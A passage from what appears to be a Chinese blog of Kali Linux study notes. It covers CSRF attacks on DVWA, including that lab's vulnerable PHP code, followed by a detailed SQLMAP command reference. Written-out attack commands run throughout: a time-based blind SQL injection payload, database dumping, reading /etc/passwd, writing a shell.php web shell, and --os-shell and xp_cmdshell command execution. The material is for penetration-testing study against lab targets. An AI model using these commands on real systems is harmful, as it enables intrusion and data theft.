<li>CSRF → Post方法<ul>
<li>View Source查看页面的源代码</li>
<li>保存表单form的内容存成一个页面，csrf-post.html</li>
<li>诱使用户点击</li>
</ul>
</li>
<li>Burpsuit → 右键请求 → Engagement tools → Generate CSRF Poc ▲ 2020.1.21只有Burpsuite Professional版本才有此功能<ul>
<li>Burpsuit自动生成CSRF生成的一个页面</li>
<li><strong><code>🔺命令：cd /var/www/html</code></strong> <strong><code>🔺命令：vi csrf-post-burp.html</code></strong></li>
<li>window上访问csrf-post-burp.html</li>
</ul>
</li>
</ul>
<h4 id="3-CSRF–DVWA"><a href="#3-CSRF–DVWA" class="headerlink" title="3. CSRF–DVWA"></a>3. CSRF–DVWA</h4><ul>
<li>Dvwa中的CSRF（Low）<ul>
<li>多种绕过方式</li>
</ul>
</li>
</ul>
<pre><code> &lt;?php

    if (isset($_GET[&#39;Change&#39;])) {

        // Turn requests into variables
        $pass_new = $_GET[&#39;password_new&#39;];
        $pass_conf = $_GET[&#39;password_conf&#39;];


        if (($pass_new == $pass_conf)){
            $pass_new = mysql_real_escape_string($pass_new);
            $pass_new = md5($pass_new);

            $insert=&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;admin&#39;;&quot;;
            $result=mysql_query($insert) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );

            echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        
            mysql_close();
        }

        else{        
            echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;;            
        }

    }
?&gt; </code></pre><ul>
<li>Dvwa中的CSRF（Medium）<ul>
<li>eregi()函数，取HTTP_REFERER进行比较判断</li>
<li>绕过方法：Burpsuite抓包截断进行修改HTTP头的Referer参数</li>
</ul>
</li>
</ul>
<pre><code> &lt;?php

    if (isset($_GET[&#39;Change&#39;])) {

        // Checks the http referer header
        if ( eregi ( &quot;127.0.0.1&quot;, $_SERVER[&#39;HTTP_REFERER&#39;] ) ){

            // Turn requests into variables
            $pass_new = $_GET[&#39;password_new&#39;];
            $pass_conf = $_GET[&#39;password_conf&#39;];

            if ($pass_new == $pass_conf){
                $pass_new = mysql_real_escape_string($pass_new);
                $pass_new = md5($pass_new);

                $insert=&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;admin&#39;;&quot;;
                $result=mysql_query($insert) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );

                echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        
                mysql_close();
            }

            else{        
                echo &quot;&lt;pre&gt; Passwords did not match. &lt;/pre&gt;&quot;;            
            }    

        }

    }
?&gt;</code></pre><ul>
<li>Dvwa中的CSRF（High）<ul>
<li>表单加入当前密码认证（二次认证）</li>
<li>基本无绕过方式</li>
</ul>
</li>
</ul>
<pre><code> &lt;?php

    if (isset($_GET[&#39;Change&#39;])) {

        // Turn requests into variables
        $pass_curr = $_GET[&#39;password_current&#39;];
        $pass_new = $_GET[&#39;password_new&#39;];
        $pass_conf = $_GET[&#39;password_conf&#39;];

        // Sanitise current password input
        $pass_curr = stripslashes( $pass_curr );
        $pass_curr = mysql_real_escape_string( $pass_curr );
        $pass_curr = md5( $pass_curr );

        // Check that the current password is correct
        $qry = &quot;SELECT password FROM `users` WHERE user=&#39;admin&#39; AND password=&#39;$pass_curr&#39;;&quot;;
        $result = mysql_query($qry) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );

        if (($pass_new == $pass_conf) &amp;&amp; ( $result &amp;&amp; mysql_num_rows( $result ) == 1 )){
            $pass_new = mysql_real_escape_string($pass_new);
            $pass_new = md5($pass_new);

            $insert=&quot;UPDATE `users` SET password = &#39;$pass_new&#39; WHERE user = &#39;admin&#39;;&quot;;
            $result=mysql_query($insert) or die(&#39;&lt;pre&gt;&#39; . mysql_error() . &#39;&lt;/pre&gt;&#39; );

            echo &quot;&lt;pre&gt; Password Changed &lt;/pre&gt;&quot;;        
            mysql_close();
        }

        else{        
            echo &quot;&lt;pre&gt; Passwords did not match or current password incorrect. &lt;/pre&gt;&quot;;            
        }

    }
?&gt;</code></pre>]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(五十一)：SQLMAP</title>
    <url>/2020/01/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%94%E5%8D%81%E4%B8%80)%EF%BC%9ASQLMAP/</url>
    <content><![CDATA[<hr>
<h4 id="1-SQLMAP自动注入"><a href="#1-SQLMAP自动注入" class="headerlink" title="1. SQLMAP自动注入"></a>1. SQLMAP自动注入</h4><ul>
<li>开源sql注入漏洞检测、利用工具（python语言开发）</li>
<li>检测动态页面中get/post参数、cookie、http头</li>
<li>数据榨取</li>
<li>文件系统访问</li>
<li>操作系统命令执行</li>
<li>引擎强大、特性丰富</li>
<li>XSS漏洞检测</li>
</ul>
<blockquote>
<pre><code>⭐WEB渗透需要深入掌握SQL漏洞的原理以及注入</code></pre></blockquote>
<h4 id="2-SQLMAP–检测技术"><a href="#2-SQLMAP–检测技术" class="headerlink" title="2. SQLMAP–检测技术"></a>2. SQLMAP–检测技术</h4><ul>
<li>基于布尔的盲注检测（真/假）</li>
<li>基于时间的盲注检测（响应时间长短）<ul>
<li>‘and (select * from (select(sleep(20)))a)–+</li>
</ul>
</li>
<li>基于错误的检测</li>
<li>基于UNION联合查询的检测<ul>
<li>适用于通过循环直接输出联合查询结果，否则只显示第一项结果</li>
</ul>
</li>
<li>基于堆叠查询的检测<ul>
<li>;堆叠多个查询语句</li>
<li>适用于非select的数据修改、删除操作</li>
</ul>
</li>
<li>支持的数据库管理系统DBMS<ul>
<li>MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access，IBM DB2，SQLite，Firebird，Sybase，SAP MaxDB</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐NOSQLMAP可以查询NOSQL数据库里面的类型（非关系型数据库）</code></pre></blockquote>
<h4 id="3-SQLMAP–其他特性"><a href="#3-SQLMAP–其他特性" class="headerlink" title="3. SQLMAP–其他特性"></a>3. SQLMAP–其他特性</h4><ul>
<li>数据库直接连接-d<ul>
<li>不通过SQL注入，制定身份认证信息、IP、端口（Orcal 121，SQL Server 3433）</li>
</ul>
</li>
<li>与burpsuite、google结合使用，支持政策表达式限定测试目标</li>
<li>Get、Post、Cookie、Referer、User-Agent（随机或指定目标）<ul>
<li>Cookie过期后自动处理Set-Cookie头，更新Cookie信息（SQLMAP自动探测）</li>
</ul>
</li>
<li>限制：最大并发，延迟发送</li>
<li>支持Basic、Digest、NTLM、客户端CA身份认证（软证书+pin码，对客户端的身份认证）</li>
<li>数据库版本、用户、权限、hash枚举和字典破解、暴力破解表列名称（无法进行union select）</li>
<li>文件上传下载、UDF、启动并执行存储过程、操作系统命令执行、访问windows注册表</li>
<li>与w3af、metasploit集成结合使用，基于数据库服务进程提权和上传执行后门</li>
</ul>
<h4 id="4-SQLMAP–安装与更新"><a href="#4-SQLMAP–安装与更新" class="headerlink" title="4. SQLMAP–安装与更新"></a>4. SQLMAP–安装与更新</h4><ul>
<li>基于python2.7开发</li>
<li>安装<ul>
<li><strong><code>🔺命令：apt-get install git</code></strong></li>
<li><strong><code>🔺命令：git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code></strong></li>
</ul>
</li>
<li>升级<ul>
<li><strong><code>🔺命令：sqlmap --update</code></strong> 在线</li>
<li><strong><code>🔺命令：git pull</code></strong> 离线</li>
</ul>
</li>
<li>Kali集成版随Kali库更新（Kali rolling版本可以直接通过update、upgrade）</li>
</ul>
<blockquote>
<pre><code>⭐Kali集成版更新（▲ 2020.1.15 更新可能在bash中找不到sqlmap）
1.git clone https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
2.sqlmap --update</code></pre></blockquote>
<h4 id="5-SQLMAP–Options-Target参数"><a href="#5-SQLMAP–Options-Target参数" class="headerlink" title="5. SQLMAP–Options/Target参数"></a>5. SQLMAP–Options/Target参数</h4><ul>
<li>Options<ul>
<li>-h（显示粗略信息)</li>
<li>-hh（显示详细信息）</li>
<li>–version（SQLMAP版本信息）</li>
<li>-v （版本信息，分为0-5级，默认为1级）</li>
</ul>
</li>
<li>Target<ul>
<li>-d（直接连接，作为数据库的客户端）</li>
<li>-u（URL地址，需要有变量名称）</li>
<li>-l（log file记录日志，可以来自Burp or webscarab）</li>
<li>-x（站点地图，可以提交以xml文件的形式）</li>
<li>-m（url地址表，多个url地址保存为文本文件）</li>
<li>-r（http头请求信息提交，保存http头请求信息）</li>
<li>-g（Google搜索引擎，正则表达式）</li>
<li>-c（配置文件，保存扫描的配置文件）</li>
</ul>
</li>
</ul>
<h4 id="6-SQLMAP–Target-→-直接连接"><a href="#6-SQLMAP–Target-→-直接连接" class="headerlink" title="6. SQLMAP–Target → 直接连接"></a>6. SQLMAP–Target → 直接连接</h4><ul>
<li>直接方法<ul>
<li>sqlmap -d “mysql://user:<a href="mailto:password@192.168.1.1" target="_blank" rel="noopener">password@192.168.1.1</a>:3306/dvwa”</li>
<li>–users（数据库的管理账号）</li>
<li>–banner（目标系统版本，数据库类型版本）</li>
<li>–dbs（查询目标数据库管理系统的库）</li>
<li>–schema（源数据库）</li>
<li>-a（所有数据信息）</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>⭐查询结果，默认保存在：/root/.sqlmap/output/中</code></pre></blockquote>
<h4 id="7-SQLMAP–Target-→-Get方法"><a href="#7-SQLMAP–Target-→-Get方法" class="headerlink" title="7. SQLMAP–Target → Get方法"></a>7. SQLMAP–Target → Get方法</h4><ul>
<li>Get方法<ul>
<li>sqlmap -u “<a href="http://1.1.1.1/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=22&amp;user-info-php-submit-button=View+Account+Datails&quot;" target="_blank" rel="noopener">http://1.1.1.1/mutillidae/index.php?page=user-info.php&amp;username=1&amp;password=22&amp;user-info-php-submit-button=View+Account+Datails&quot;</a> -p（只检查） username -f（数据库的指纹）</li>
<li><ul>
<li>–users（数据库的管理账号）</li>
</ul>
</li>
<li>–banner（目标系统版本，数据库类型版本）</li>
<li>–dbs（查询目标数据库管理系统的库）</li>
<li>–schema（源数据库）</li>
<li>-a（所有数据信息）</li>
</ul>
</li>
</ul>
<h4 id="8-SQLMAP–Target-→-扫描URL列表文件"><a href="#8-SQLMAP–Target-→-扫描URL列表文件" class="headerlink" title="8. SQLMAP–Target → 扫描URL列表文件"></a>8. SQLMAP–Target → 扫描URL列表文件</h4><ul>
<li>扫描URL列表文件<ul>
<li><a href="http://1.1.1.1/vuln1.php?q=foobar" target="_blank" rel="noopener">http://1.1.1.1/vuln1.php?q=foobar</a></li>
<li><a href="http://1.1.1.1/vuln3/id/1" target="_blank" rel="noopener">http://1.1.1.1/vuln3/id/1</a>*</li>
<li>sqlmap -m list.txt</li>
</ul>
</li>
</ul>
<h4 id="9-SQLMAP–Target-→-扫描Google搜索结果"><a href="#9-SQLMAP–Target-→-扫描Google搜索结果" class="headerlink" title="9. SQLMAP–Target → 扫描Google搜索结果"></a>9. SQLMAP–Target → 扫描Google搜索结果</h4><ul>
<li>扫描Google搜索结果（需要代理链，配置才能使用）<ul>
<li>sqlmap.py -g “inurl:&quot;.php?id=1&quot;“</li>
</ul>
</li>
</ul>
<h4 id="10-SQLMAP–Target-→-POST方法"><a href="#10-SQLMAP–Target-→-POST方法" class="headerlink" title="10. SQLMAP–Target → POST方法"></a>10. SQLMAP–Target → POST方法</h4><ul>
<li>使用http请求文件（burpsuite）<ul>
<li>使用Burp，设置浏览器代理，POST提交数据的登录形式</li>
<li>复制http请求头，gedit黏贴在新建request.txt中</li>
<li>sqlmap -r request.txt（通过Burp抓取请求的文件）</li>
</ul>
</li>
<li>使用burpsuite log文件<ul>
<li>Options → Misc → Project Logging → Proxy Requests</li>
<li>保存为log.txt，发送Http请求（关闭Intercept）</li>
<li>sqlmap -l log.txt</li>
</ul>
</li>
</ul>
<h4 id="11-SQLMAP–Target-→-HTTPS"><a href="#11-SQLMAP–Target-→-HTTPS" class="headerlink" title="11. SQLMAP–Target → HTTPS"></a>11. SQLMAP–Target → HTTPS</h4><ul>
<li>sqlmap -u “<a href="https://1.1.1.1/a.php?id=1:8843&quot;" target="_blank" rel="noopener">https://1.1.1.1/a.php?id=1:8843&quot;</a> –force-ssl</li>
</ul>
<h4 id="12-SQLMAP–Target-→-扫描配置文件"><a href="#12-SQLMAP–Target-→-扫描配置文件" class="headerlink" title="12. SQLMAP–Target → 扫描配置文件"></a>12. SQLMAP–Target → 扫描配置文件</h4><ul>
<li>查找sqlmap.conf（/etc/sqlmap/sqlmap.conf）</li>
<li>sqlmap -c sqlmap.conf</li>
</ul>
<h4 id="13-SQLMAP–REQUEST-→-数据段"><a href="#13-SQLMAP–REQUEST-→-数据段" class="headerlink" title="13. SQLMAP–REQUEST → 数据段"></a>13. SQLMAP–REQUEST → 数据段</h4><ul>
<li>数据段： –data<ul>
<li>get/post都适用</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php&quot;</a> –data=”user=1&amp;pass=2（get的url参数部分/post的源代码）” -f</li>
</ul>
</li>
</ul>
<h4 id="14-SQLMAP–REQUEST-→-变量分隔符"><a href="#14-SQLMAP–REQUEST-→-变量分隔符" class="headerlink" title="14. SQLMAP–REQUEST → 变量分隔符"></a>14. SQLMAP–REQUEST → 变量分隔符</h4><ul>
<li>变量分隔符： –param-del<ul>
<li><a href="http://1.1.1.1/a.php?q=foo;id=1" target="_blank" rel="noopener">http://1.1.1.1/a.php?q=foo;id=1</a>  //  ;  &amp;</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php&quot;</a> –data=”q=foo;id=1” –param-del=”;” -f</li>
</ul>
</li>
</ul>
<h4 id="15-SQLMAP–REQUEST-→-Cookie头"><a href="#15-SQLMAP–REQUEST-→-Cookie头" class="headerlink" title="15.SQLMAP–REQUEST → Cookie头"></a>15.SQLMAP–REQUEST → Cookie头</h4><ul>
<li>–cookie</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=12&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=12&quot;</a> –cookie=”a=1；b=2（Cooke的值）” -f </li>
<li>web应用需要基于cookie的身份认证</li>
<li>检查存在cookie中的注入点（sqlmap自动测试）</li>
<li>Set-Cookie/–drop-set-cookie</li>
</ul>
<blockquote>
<pre><code>⭐SQLMAP扫描的Level1不会扫描cookie中存在的漏洞，至少得从Level2开始，--level 2</code></pre></blockquote>
<h4 id="16-SQLMAP–REQUEST-→-Agent"><a href="#16-SQLMAP–REQUEST-→-Agent" class="headerlink" title="16. SQLMAP–REQUEST → Agent"></a>16. SQLMAP–REQUEST → Agent</h4><ul>
<li>–user-agent<ul>
<li>sqlmap/1.0-dev-xxxxxxxx(<a href="http://sqlmap.org" target="_blank" rel="noopener">http://sqlmap.org</a>)</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –user-agent=”aaaaaa” –dbs</li>
</ul>
</li>
<li>–random-agent<ul>
<li>/usr/share/sqlmap/txt/yser-agents.txt</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –random-agent –dbs</li>
</ul>
</li>
<li>sqlmap检查user-agent中的注入点：Level&gt;=3</li>
<li>APP/WAF/IPS/IDS过滤异常user-agent时报错<ul>
<li>[hh:mm:20][ERROR] the target URL responded with an unknown HTTP status code,try to force the HTTP User-Agent header with option –useragent or –random-agent</li>
</ul>
</li>
</ul>
<h4 id="17-SQLMAP–REQUEST-→-Host-Referer-额外的header"><a href="#17-SQLMAP–REQUEST-→-Host-Referer-额外的header" class="headerlink" title="17. SQLMAP–REQUEST → Host/Referer/额外的header"></a>17. SQLMAP–REQUEST → Host/Referer/额外的header</h4><ul>
<li>Host头：–host<ul>
<li>Level=5</li>
</ul>
</li>
<li>Referer头：–referer<ul>
<li>Level&gt;=3</li>
</ul>
</li>
<li>额外的header：–headers<ul>
<li>每个头单独一行（名称区分大小写，大小写敏感）</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=123&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=123&quot;</a> –headers=”Host:<a href="http://www.a.com\nUser-Agent:yuanfh&quot;" target="_blank" rel="noopener">www.a.com\nUser-Agent:yuanfh&quot;</a></li>
</ul>
</li>
<li>–method=GET/POST（发送请求的方法，指定请求方法）</li>
</ul>
<h4 id="18-SQLMAP–REQUEST-→-基于HTTP协议的身份验证"><a href="#18-SQLMAP–REQUEST-→-基于HTTP协议的身份验证" class="headerlink" title="18. SQLMAP–REQUEST → 基于HTTP协议的身份验证"></a>18. SQLMAP–REQUEST → 基于HTTP协议的身份验证</h4><ul>
<li>基于HTTP协议的身份验证<ul>
<li>Basic</li>
<li>Digest</li>
<li>NTLM</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –auth-type Basic –auth-cred “user:pass”</li>
</ul>
</li>
<li>–auth-cert/–auth-file（基于客户端证书的身份认证）<ul>
<li>–auth-file=”ca.PEM”</li>
<li>含有私钥的PEM格式证书文件</li>
<li>PEM格式的证书链文件</li>
</ul>
</li>
</ul>
<h4 id="19-SQLMAP–REQUEST-→-http-s-代理"><a href="#19-SQLMAP–REQUEST-→-http-s-代理" class="headerlink" title="19. SQLMAP–REQUEST → http(s)代理"></a>19. SQLMAP–REQUEST → http(s)代理</h4><ul>
<li>http(s)代理（搜索引起：inurl:.php?id=）<ul>
<li>–proxy=”<a href="http://127.0.0.1:8087&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087&quot;</a></li>
<li>–proxy=”socks5://127.0.0.1:8087”</li>
<li>–proxy-cred=”name:pass”（代理的身份认证）</li>
<li>–ignore-proxy（忽略系统级代理设置，通常用于扫描本地网络目标）</li>
</ul>
</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&quot;</a> –proxy=”<a href="http://127.0.0.1:8087&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087&quot;</a> -f</li>
</ul>
<h4 id="20-SQLMAP–REQUEST-→-delay-timeout-retries-randomize"><a href="#20-SQLMAP–REQUEST-→-delay-timeout-retries-randomize" class="headerlink" title="20. SQLMAP–REQUEST → delay/timeout/retries/randomize"></a>20. SQLMAP–REQUEST → delay/timeout/retries/randomize</h4><ul>
<li>–delay<ul>
<li>每次http(s)请求之间的延迟时间，浮点数，单位为秒，默认无延迟</li>
</ul>
</li>
<li>–timeout<ul>
<li>请求超时时间，浮点数，默认为30秒</li>
</ul>
</li>
<li>–retries<ul>
<li>http(s)连接超时重试次数，默认为3秒</li>
</ul>
</li>
<li>–randomize<ul>
<li>长度、类型与原始值保持一致的前提下，指定每次请求随机取值的参数名</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=100&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=100&quot;</a> –randomize=”id”</li>
</ul>
</li>
</ul>
<h4 id="21-SQLMAP–REQUEST-→-scope-safe"><a href="#21-SQLMAP–REQUEST-→-scope-safe" class="headerlink" title="21. SQLMAP–REQUEST → scope/safe"></a>21. SQLMAP–REQUEST → scope/safe</h4><ul>
<li>–scope<ul>
<li>过滤日志内容，通过正则表达式筛选扫描对象</li>
<li>sqlmap -l burp.log –scope=”(www)?.target.(com|net|org)”</li>
<li>sqlmap -l 2.log –scope=”(19)?.168.20.(1|10|100)” –level 3 –dbs</li>
<li>▲ User-agent中的注入点</li>
</ul>
</li>
<li>–safe-url/–safe-freq（两个需同时使用）<ul>
<li>检测和盲注阶段会产生大量失败请求，服务器端可能因此销毁Session</li>
<li>每发送–safe-freq次注入请求后，发送一次正常请求</li>
</ul>
</li>
</ul>
<h4 id="22-SQLMAP–REQUEST-→-skip-urlencode-eval"><a href="#22-SQLMAP–REQUEST-→-skip-urlencode-eval" class="headerlink" title="22. SQLMAP–REQUEST → skip-urlencode/eval"></a>22. SQLMAP–REQUEST → skip-urlencode/eval</h4><ul>
<li>–skip-urlencode<ul>
<li>默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据</li>
</ul>
</li>
<li>–eval<ul>
<li>每次请求前执行指定的python代码</li>
<li>每次请求更改或增加新的参数值（时间依赖、其他参数值依赖）</li>
<li>sqlmap -u “<a href="http://1.1.1.1/a.php?id=1&amp;hash=&quot;=c4ca4238a0b923820dcc509a6f75849b&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.php?id=1&amp;hash=&quot;=c4ca4238a0b923820dcc509a6f75849b&quot;</a> –eval=”import hashlib;hash=hashlib.md5(id).hexdigest()”</li>
</ul>
</li>
</ul>
<h4 id="23-SQLMAP–Optimization参数（性能优化）"><a href="#23-SQLMAP–Optimization参数（性能优化）" class="headerlink" title="23. SQLMAP–Optimization参数（性能优化）"></a>23. SQLMAP–Optimization参数（性能优化）</h4><ul>
<li>-o（开启所有参数的优化，除threads参数外）</li>
<li>–predict-output</li>
<li>–keep-alive</li>
<li>–null-connection</li>
<li>–threads=THREADS</li>
</ul>
<h4 id="24-SQLMAP–Optimization-→-predict-output"><a href="#24-SQLMAP–Optimization-→-predict-output" class="headerlink" title="24. SQLMAP–Optimization → predict-output"></a>24. SQLMAP–Optimization → predict-output</h4><ul>
<li>根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率</li>
<li>版本名、用户名、密码、Privileges、role、数据库名称、表名、列名</li>
<li>▲ 与–threads参数不兼容</li>
<li>统计表：/usr/share/sqlmap/txt/common-outputs.txt</li>
</ul>
<h4 id="25-SQLMAP–Optimization-→-Keep-alive"><a href="#25-SQLMAP–Optimization-→-Keep-alive" class="headerlink" title="25. SQLMAP–Optimization → Keep alive"></a>25. SQLMAP–Optimization → Keep alive</h4><ul>
<li>–keep alive</li>
<li>使用http(s)长连接，性能好</li>
<li>▲ 与–proxy参数不兼容</li>
<li>长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源</li>
</ul>
<h4 id="26-SQLMAP–Optimization-→-null-connection"><a href="#26-SQLMAP–Optimization-→-null-connection" class="headerlink" title="26. SQLMAP–Optimization → null-connection"></a>26. SQLMAP–Optimization → null-connection</h4><ul>
<li>–null-connection</li>
<li>只获取相应页面的大小值，而非页面具体内容</li>
<li>通常用于盲注判断真/假，降低网络带宽消耗</li>
<li>▲ 与–text-only参数不兼容（基于页面内容的比较判断真/假）</li>
</ul>
<h4 id="27-SQLMAP–Optimization-→-threads"><a href="#27-SQLMAP–Optimization-→-threads" class="headerlink" title="27. SQLMAP–Optimization → threads"></a>27. SQLMAP–Optimization → threads</h4><ul>
<li>–threads=THREADS</li>
<li>最大并发线程</li>
<li>盲注时每个线程获取一个字符（每个线程7次请求），获取完成后线程结束</li>
<li>默认值为1，建议不要超过10，否则可能影响目标站点可用性</li>
<li>▲ 与–predict-output参数不兼容</li>
</ul>
<blockquote>
<pre><code>⭐7次请求即可以获取到一个ASCII码字符，即可打印字符为128个</code></pre></blockquote>
<h4 id="28-SQLMAP–ENUMERATION-→-枚举数据库数据"><a href="#28-SQLMAP–ENUMERATION-→-枚举数据库数据" class="headerlink" title="28. SQLMAP–ENUMERATION → 枚举数据库数据"></a>28. SQLMAP–ENUMERATION → 枚举数据库数据</h4><ul>
<li>–current-user（当前数据库管理系统账号）</li>
<li>–current-db（当前数据库管理系统的数据库）</li>
<li>–hostname（当前机器主机名）</li>
<li>–users（数据库管理系统所有账号）</li>
<li>–privileges -U username（CU当前账号）</li>
<li>–roles（数据库角色）</li>
<li>–dbs（数据库管理系统所有的数据库）</li>
<li>–tables、–colums、–exclude-sysdbs（排除系统库）</li>
<li>-D db（指定所使用的数据库）</li>
<li>-T table（指定所使用的数据表）</li>
<li>-C user –colusms（指定某个列）</li>
<li>–schema（表结构）–batch（批处理） –exclude-sysdbs 元数据（使用默认选项）</li>
<li>–count（表的行数）</li>
</ul>
<h4 id="29-SQLMAP–ENUMERATION-→-具体数据操作"><a href="#29-SQLMAP–ENUMERATION-→-具体数据操作" class="headerlink" title="29. SQLMAP–ENUMERATION → 具体数据操作"></a>29. SQLMAP–ENUMERATION → 具体数据操作</h4><ul>
<li>Dump数据<ul>
<li>–dump,-C,-T,-D,–start,–stop</li>
<li>–dump-all –exclude-sysdbs</li>
<li>–sql-query “select * from users”</li>
</ul>
</li>
</ul>
<h4 id="30-SQLMAP–BRUFE-FORCE（暴力破解）"><a href="#30-SQLMAP–BRUFE-FORCE（暴力破解）" class="headerlink" title="30. SQLMAP–BRUFE FORCE（暴力破解）"></a>30. SQLMAP–BRUFE FORCE（暴力破解）</h4><ul>
<li>Mysql&lt;5.0，没有information_schema库</li>
<li>Mysql&gt;=5.0，但无权读取information_schema库</li>
<li>微软的access数据库，默认无权读取MSysObjects库</li>
<li>–common-tables</li>
<li>–common-columns（Access系统表无列信息）</li>
</ul>
<h4 id="31-SQLMAP–UDF-INJECTION（用户自定义函数注入）"><a href="#31-SQLMAP–UDF-INJECTION（用户自定义函数注入）" class="headerlink" title="31. SQLMAP–UDF INJECTION（用户自定义函数注入）"></a>31. SQLMAP–UDF INJECTION（用户自定义函数注入）</h4><ul>
<li>–udf-inject,–share-lib<ul>
<li>编译共享库创建并上传至DB Server，以此生成UDF实现高级注入</li>
<li>Linux：shared object</li>
<li>Windows：DLL</li>
<li><a href="http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857" target="_blank" rel="noopener">http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-systemfull-control-whitepaper-4633857</a></li>
</ul>
</li>
</ul>
<h4 id="32-SQLMAP–FILE-SYSTEM（文件系统）"><a href="#32-SQLMAP–FILE-SYSTEM（文件系统）" class="headerlink" title="32. SQLMAP–FILE SYSTEM（文件系统）"></a>32. SQLMAP–FILE SYSTEM（文件系统）</h4><ul>
<li>–file-read=”/etc/passwd”</li>
<li>–file-write=”shell.php” –file-dest=”/tmp/shell.php”</li>
</ul>
<h4 id="33-SQLMAP–OS（操作系统）（▲-2020-1-15命令执行无返回数据）"><a href="#33-SQLMAP–OS（操作系统）（▲-2020-1-15命令执行无返回数据）" class="headerlink" title="33. SQLMAP–OS（操作系统）（▲ 2020.1.15命令执行无返回数据）"></a>33. SQLMAP–OS（操作系统）（▲ 2020.1.15命令执行无返回数据）</h4><ul>
<li>–os-cmd id（执行一个命令）</li>
<li>–os-shell</li>
<li>–sql-shell</li>
<li>Mysql、postgresql<ul>
<li>上传共享库并生成sys_exec()、sys_eval()两个UDF</li>
</ul>
</li>
<li>Mssql<ul>
<li>xp_cmdshell存储过程（有就用，禁了启，没有建）</li>
</ul>
</li>
</ul>
<h4 id="34-SQLMAP–WINDOWS-REGISTORY（Windows）"><a href="#34-SQLMAP–WINDOWS-REGISTORY（Windows）" class="headerlink" title="34. SQLMAP–WINDOWS REGISTORY（Windows）"></a>34. SQLMAP–WINDOWS REGISTORY（Windows）</h4><ul>
<li>–reg-read</li>
<li>–reg-add</li>
<li>–reg-del</li>
<li>–reg-key、–reg-value、–reg-data、–reg-type</li>
<li>sqlmap –u=”<a href="http://1.1.1.1/a.aspx?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/a.aspx?id=1&quot;</a> –reg-add –regkey=”HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap” –reg-value=Test -reg-type=REG_SZ –reg-data=1</li>
</ul>
<h4 id="35-SQLMAP–GENERAL（一般性参数）"><a href="#35-SQLMAP–GENERAL（一般性参数）" class="headerlink" title="35. SQLMAP–GENERAL（一般性参数）"></a>35. SQLMAP–GENERAL（一般性参数）</h4><ul>
<li>-s（sqlite会话文件保存位置）</li>
<li>-t（记录流量文件保存位置）</li>
<li>–charset（强制字符编码）<ul>
<li>–charset=GBK</li>
</ul>
</li>
<li>–crawl（从起始位置爬站深度）<ul>
<li>–batch –crawl=3</li>
</ul>
</li>
<li>–csv-del（dump数据默认存于”,”分割的CSV文件，指定其他分隔符）<ul>
<li>–csv-del=”;”</li>
</ul>
</li>
<li>–dbms-cred（指定数据库账号）</li>
<li>–flush-session（清空session）</li>
<li>–force-ssl（https链接）</li>
<li>–fresh-queries（忽略session查询结果）</li>
<li>–hex（dump非ASCII码字符内容时，将其编码为16进制形式，收到后解码还原，防过滤）<ul>
<li>sqlmap -u “<a href="http://1.1.1.1/s.php?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/s.php?id=1&quot;</a> –hex -v 3</li>
</ul>
</li>
<li>–output-dir=/tmp</li>
<li>–parse-errors（分析和现实数据库内建报错信息）<ul>
<li>sqlmap -u “<a href="http://1.1.1.1/sqlmap/a.asp?id=1&quot;" target="_blank" rel="noopener">http://1.1.1.1/sqlmap/a.asp?id=1&quot;</a> –parse-errors</li>
</ul>
</li>
<li>–save（将命令保存成配置文件）</li>
</ul>
<h4 id="36-SQLMAP–MISCELLANEOUS-→-助记符（-z）"><a href="#36-SQLMAP–MISCELLANEOUS-→-助记符（-z）" class="headerlink" title="36. SQLMAP–MISCELLANEOUS → 助记符（-z）"></a>36. SQLMAP–MISCELLANEOUS → 助记符（-z）</h4><ul>
<li>-z（参数助记符）</li>
